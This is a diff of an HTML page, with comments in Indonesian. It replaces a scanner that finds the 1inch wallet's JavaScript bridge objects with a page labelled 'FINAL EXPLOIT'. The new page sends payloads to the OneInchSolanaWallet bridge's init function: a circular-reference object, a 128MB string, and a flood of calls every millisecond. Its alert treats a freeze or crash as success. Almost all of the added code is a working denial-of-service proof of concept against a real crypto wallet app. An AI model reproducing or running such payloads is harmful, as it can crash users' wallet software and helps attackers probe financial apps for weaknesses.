@@ -1,49 +1,57 @@
 <!DOCTYPE html>
 <html>
-<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1inch Final Crash Test</title>
+</head>
+<body style="background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 40px;">
 
-    <h3>🔍 BRIDGE DIAGNOSTIC MODE</h3>
-    <button onclick="scanBridge()" style="padding: 15px; background: #333; color: #0f0; border: 1px solid #0f0; width: 100%;">
-        SCAN FOR ACTIVE BRIDGE
-    </button>
+    <div style="border: 2px solid #ff453a; padding: 20px; border-radius: 15px; background: #1c1c1e;">
+        <h2 style="color: #ff453a;">🚀 FINAL EXPLOIT</h2>
+        <p style="font-size: 14px; color: #aaa;">Targeting: <code>OneInchSolanaWallet</code></p>
+        
+        <button onclick="executeFinal()" style="padding: 20px; background: #ff453a; color: #fff; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer;">
+            FIRE ALL VECTORS
+        </button>
 
-    <div id="results" style="margin-top: 20px; text-align: left; font-size: 12px; white-space: pre-wrap;">
-        Waiting for scan...
+        <p id="status" style="margin-top: 20px; font-size: 12px; color: #888;">Ready to fire...</p>
     </div>
 
     <script>
-    function scanBridge() {
-        const results = document.getElementById('results');
-        results.innerHTML = "Scanning standard bridges...\n";
+    function executeFinal() {
+        const status = document.getElementById('status');
         
-        // Daftar kemungkinan nama bridge 1inch
-        const targets = [
-            'OneInchiOSWallet', 
-            'OneInchSolanaWallet', 
-            'OneInchAndroidWallet', 
-            'ethereum', 
-            'oneinch'
-        ];
+        // Menggunakan target yang ditemukan dari scan kamu
+        const bridge = window.OneInchSolanaWallet || window.OneInchiOSWallet;
 
-        targets.forEach(t => {
-            if (window[t]) {
-                results.innerHTML += `✅ FOUND: window.${t}\n`;
-                // List semua fungsi yang ada di dalam bridge itu
-                const methods = Object.getOwnPropertyNames(window[t]);
-                results.innerHTML += `   Methods: [${methods.join(', ')}]\n\n`;
-            } else {
-                results.innerHTML += `❌ NOT FOUND: window.${t}\n`;
-            }
-        });
+        if (bridge && typeof bridge.init === 'function') {
+            status.innerText = "Target locked. Sending payloads...";
+            status.style.color = "yellow";
 
-        // Jika semua gagal, scan seluruh objek window yang punya kata 'Inch'
-        results.innerHTML += "\nScanning all window objects for 'Inch' keywords...\n";
-        for (let prop in window) {
-            if (prop.toLowerCase().includes('inch')) {
-                results.innerHTML += `⭐ POTENTIAL: window.${prop}\n`;
+            try {
+                // 1. JSON Circular Bomb
+                const bomb = {}; bomb.a = bomb;
+                bridge.init(bomb);
+
+                // 2. Memory Exhaustion (128MB)
+                const junk = "A".repeat(128 * 1024 * 1024);
+                bridge.init(junk);
+
+                // 3. Thread Flooding (Looping)
+                setInterval(() => {
+                    bridge.init(Math.random().toString());
+                }, 1);
+
+                alert("Payload sent! If it freezes/closes, the PoC is successful.");
+            } catch (e) {
+                status.innerText = "Error during execution: " + e.message;
             }
+        } else {
+            status.innerText = "Bridge still not reachable. Try scanning again.";
+            status.style.color = "red";
         }
     }
     </script>
+
 </body>
 </html>
